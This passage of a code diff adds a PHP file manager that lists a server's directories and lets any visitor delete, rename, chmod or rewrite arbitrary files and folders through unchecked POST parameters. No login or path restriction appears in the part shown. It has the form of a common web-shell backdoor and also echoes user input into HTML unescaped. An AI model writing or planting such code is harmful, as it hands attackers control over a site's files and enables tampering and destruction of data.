+                echo '<font color="green">Change Name Done.</font><br />';
+            }else{
+                echo '<font color="red">Change Name Error.</font><br />';
+            }
+            $_POST['name'] = $_POST['newname'];
+        }
+        echo '<form method="POST">
+        New Name : <input name="newname" type="text" size="20" value="'.$_POST['name'].'" />
+        <input type="hidden" name="path" value="'.$_POST['path'].'">
+        <input type="hidden" name="opt" value="rename">
+        <input type="submit" value="Go" />
+        </form>';
+    }elseif($_POST['opt'] == 'edit'){
+        if(isset($_POST['src'])){
+            $fp = fopen($_POST['path'],'w');
+            if(fwrite($fp,$_POST['src'])){
+                echo '<font color="green">Edit File Done.</font><br />';
+            }else{
+                echo '<font color="red">Edit File Error.</font><br />';
+            }
+            fclose($fp);
+        }
+        echo '<form method="POST">
+        <textarea cols=80 rows=20 name="src">'.htmlspecialchars(file_get_contents($_POST['path'])).'</textarea><br />
+        <input type="hidden" name="path" value="'.$_POST['path'].'">
+        <input type="hidden" name="opt" value="edit">
+        <input type="submit" value="Go" />
+        </form>';
+    }
+    echo '</center>';
+}else{
+    echo '</table><br /><center>';
+    if(isset($_GET['option']) && $_POST['opt'] == 'delete'){
+        if($_POST['type'] == 'dir'){
+            if(rmdir($_POST['path'])){
+                echo '<font color="green">Delete Dir Done.</font><br />';
+            }else{
+                echo '<font color="red">Delete Dir Error.</font><br />';
+            }
+        }elseif($_POST['type'] == 'file'){
+            if(unlink($_POST['path'])){
+                echo '<font color="green">Delete File Done.</font><br />';
+            }else{
+                echo '<font color="red">Delete File Error.</font><br />';
+            }
+        }
+    }
+    echo '</center>';
+    $scandir = scandir($path);
+    echo '<div id="content"><table width="700" border="0" cellpadding="3" cellspacing="1" align="center">
+    <tr class="first">
+        <td><center>Name</center></td>
+        <td><center>Size</center></td>
+        <td><center>Permissions</center></td>
+        <td><center>Options</center></td>
+    </tr>';
+
+    foreach($scandir as $dir){
+        if(!is_dir("$path/$dir") || $dir == '.' || $dir == '..') continue;
+        echo "<tr>
+        <td><a href=\"?path=$path/$dir\">$dir</a></td>
+        <td><center>--</center></td>
+        <td><center>";
+        if(is_writable("$path/$dir")) echo '<font color="aqua">';
+        elseif(!is_readable("$path/$dir")) echo '<font color="red">';
+        echo perms("$path/$dir");
+        if(is_writable("$path/$dir") || !is_readable("$path/$dir")) echo '</font>';
+        
+        echo "</center></td>
+        <td><center><form method=\"POST\" action=\"?option&path=$path\">
+        <select name=\"opt\">
+	    <option value=\"\"></option>
+        <option value=\"delete\">Delete</option>
+        <option value=\"chmod\">Chmod</option>
+        <option value=\"rename\">Rename</option>
+        </select>
+        <input type=\"hidden\" name=\"type\" value=\"dir\">
+        <input type=\"hidden\" name=\"name\" value=\"$dir\">
+        <input type=\"hidden\" name=\"path\" value=\"$path/$dir\">
+        <input type=\"submit\" value=\">\" />
+        </form></center></td>
+        </tr>";
+    }
+    echo '<tr class="first"><td></td><td></td><td></td><td></td></tr>';
+    foreach($scandir as $file){
+        if(!is_file("$path/$file")) continue;
+        $size = filesize("$path/$file")/1024;
+        $size = round($size,3);
+        if($size >= 1024){
+            $size = round($size/1024,2).' MB';
+        }else{
+            $size = $size.' KB';
+        }
+
+        echo "<tr>
+        <td><a href=\"?filesrc=$path/$file&path=$path\">$file</a></td>
+        <td><center>".$size."</center></td>
+        <td><center>";
+        if(is_writable("$path/$file")) echo '<font color="aqua">';
+        elseif(!is_readable("$path/$file")) echo '<font color="red">';
+        echo perms("$path/$file");
+        if(is_writable("$path/$file") || !is_readable("$path/$file")) echo '</font>';
+        echo "</center></td>
+        <td><center><form method=\"POST\" action=\"?option&path=$path\">
+        <select name=\"opt\">
+	    <option value=\"\"></option>
+        <option value=\"delete\">Delete</option>
+        <option value=\"chmod\">Chmod</option>
+        <option value=\"rename\">Rename</option>
+        <option value=\"edit\">Edit</option>
+        </select>
+        <input type=\"hidden\" name=\"type\" value=\"file\">
+        <input type=\"hidden\" name=\"name\" value=\"$file\">
+        <input type=\"hidden\" name=\"path\" value=\"$path/$file\">
+        <input type=\"submit\" value=\">\" />
+        </form></center></td>
+        </tr>";
+    }
+    echo '</table>
+    </div>';
+}
+echo '
+</BODY>
+</HTML>';
+function perms($file){
+    $perms = fileperms($file);
+
+if (($perms & 0xC000) == 0xC000) {
+    // Socket
+    $info = 's';
+} elseif (($perms & 0xA000) == 0xA000) {
+    // Symbolic Link
+    $info = 'l';
+} elseif (($perms & 0x8000) == 0x8000) {
+    // Regular
+    $info = '-';
+} elseif (($perms & 0x6000) == 0x6000) {
+    // Block special
+    $info = 'b';
+} elseif (($perms & 0x4000) == 0x4000) {
+    // Directory
+    $info = 'd';
+} elseif (($perms & 0x2000) == 0x2000) {
+    // Character special
+    $info = 'c';
+} elseif (($perms & 0x1000) == 0x1000) {
+    // FIFO pipe
+    $info = 'p';
+} else {
+    // Unknown
+    $info = 'u';
+}
+
+// Owner
+$info .= (($perms & 0x0100) ? 'r' : '-');
+$info .= (($perms & 0x0080) ? 'w' : '-');
+$info .= (($perms & 0x0040) ?
+            (($perms & 0x0800) ? 's' : 'x' ) :
+            (($perms & 0x0800) ? 'S' : '-'));
+
+// Group
+$info .= (($perms & 0x0020) ? 'r' : '-');
+$info .= (($perms & 0x0010) ? 'w' : '-');
+$info .= (($perms & 0x0008) ?
+            (($perms & 0x0400) ? 's' : 'x' ) :
+            (($perms & 0x0400) ? 'S' : '-'));
+
+// World
+$info .= (($perms & 0x0004) ? 'r' : '-');
+$info .= (($perms & 0x0002) ? 'w' : '-');
+$info .= (($perms & 0x0001) ?
+            (($perms & 0x0200) ? 't' : 'x' ) :
+            (($perms & 0x0200) ? 'T' : '-'));
+
+    return $info;
 }
 ?>
